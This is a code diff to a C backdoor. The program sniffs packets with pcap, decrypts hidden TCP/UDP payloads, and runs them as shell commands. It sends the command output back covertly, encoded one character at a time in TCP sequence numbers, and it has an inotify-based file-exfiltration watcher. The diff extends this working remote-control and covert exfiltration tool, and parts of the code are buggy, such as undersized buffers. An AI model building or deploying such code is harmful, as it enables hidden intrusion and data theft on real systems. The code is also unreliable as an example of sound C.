@@ -112,7 +112,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct tcphdr* tcphdr;
 	struct iphdr* iphdr;
 	int size_tcp, ip_len;
-	char *tcp_payload, decrypt_payload;
+	char *tcp_payload, *decrypt_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
@@ -126,12 +126,13 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	// retrieves the TCP payload
 	tcp_payload = (char *) (packet + ip_len + size_tcp);
 
-	decrypt_payload = malloc(sizeof(tcp_payload));
+	decrypt_payload = malloc(sizeof(char *));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	memcpy(decrypt_payload, decrypt(SEKRET, tcp_payload, sizeof(tcp_payload)), sizeof(tcp_payload));
+	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
+	memcpy(decrypt_payload, tcp_payload, strlen(tcp_payload));
 
-	cmd_execute(decrypt_payload, ip_addr);
+	cmd_execute(decrypt_payload, iphdr->daddr, ip_addr);
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
@@ -139,7 +140,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct udphdr* udphdr;
 	struct iphdr* iphdr;
 	int size_udp, ip_len;
-	char *udp_payload, decrypt_payload;
+	char *udp_payload, *decrypt_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
@@ -154,25 +155,29 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	udp_payload = (char *) (iphdr + ip_len + size_udp);
 
 	// initialize the variable
-	decrypt_payload = malloc(sizeof(udp_payload));
+	decrypt_payload = malloc(sizeof(char *));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	memcpy(decrypt_payload, decrypt(SEKRET, udp_payload, sizeof(udp_payload)), sizeof(udp_payload));
+	decrypt(SEKRET, udp_payload, sizeof(udp_payload));
+	memcpy(decrypt_payload, udp_payload, strlen(udp_payload));
 
-	cmd_execute(decrypt_payload, ip_addr);
+	printf("UDP PAYLOAD = %s", decrypt_payload);
+
+	cmd_execute(decrypt_payload, iphdr->daddr, ip_addr);
 }
 
-void cmd_execute(char *command, uint32 ip) {
+void cmd_execute(char *command, uint32 src, uint32 ip) {
 	FILE *fp;
 	char line[MAX_LEN];
 	char resp[MAX_LEN];
-	int tot_len;
+	char *trans;
+	int tot_len, i = 0, j = 0;
 
 	memset(line, 0, MAX_LEN);
 	memset(resp, 0, MAX_LEN);
 
 	// Run the command, grab stdout
-	fp = popen(command, "rb");
+	fp = popen(command, "r");
 
 	// Append line by line output into response buffer
 	while (fgets(line, MAX_LEN, fp) != NULL)
@@ -180,7 +185,41 @@ void cmd_execute(char *command, uint32 ip) {
 
 	tot_len = strlen(resp) + 1;
 
-	_send(ip, resp, CMD_TYP);
+	trans = malloc(sizeof(char *));
+	strncpy(trans, resp, tot_len);
+
+	for (i = 0; i < tot_len; i += 8) {
+		char frame[FRAM_SZ];
+		char *ptr;
+		int fram_len;
+		uint32 tcp_seq;
+
+		ptr = trans + i;
+
+		fram_len = (tot_len - i > 8) ? FRAM_SZ : (tot_len - i);
+
+		// binary copy of first 8 characters
+		memcpy(frame, ptr, fram_len);
+
+		// encrypt the frame of 8 characters
+		encrypt(SEKRET, frame, FRAM_SZ);
+
+		// go through the frame and send 1 character at a time
+		// in the TCP sequence field.
+
+		for (j = 0; j < FRAM_SZ; ++j) {
+			tcp_seq = DEF_SEQ;
+			tcp_seq += frame[j]; // adding to the default sequence number
+
+			usleep(SLEEP_TIME); // sleep for specific amount of time
+			_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
+		}
+	}
+
+	// free the pointer
+	free(trans);
+	// close the pipe file pointer
+	pclose(fp);
 }
 
 void *exfil_watch(void *arg) {
@@ -238,7 +277,6 @@ void *exfil_watch(void *arg) {
 			error("exfil_watch(): select");
 		else if (!ret)
 			printf("exfil_watch(): timed out\n");
-
 	}
 
 	printf("Cleaning up and Terminating......\n");
@@ -246,10 +284,12 @@ void *exfil_watch(void *arg) {
 	ret = inotify_rm_watch(fd, wd);
 	if (ret)
 		error("exfil_watch(): inotify rm watch");
-	else
-		(close(fd)) error("exfil_watch(): close");
+	else if (close(fd))
+		error("exfil_watch(): close");
 
+	return NULL;
 }
 
 void exfil_send(uint32 ipaddr, char *path) {
+//sfsdf
 }
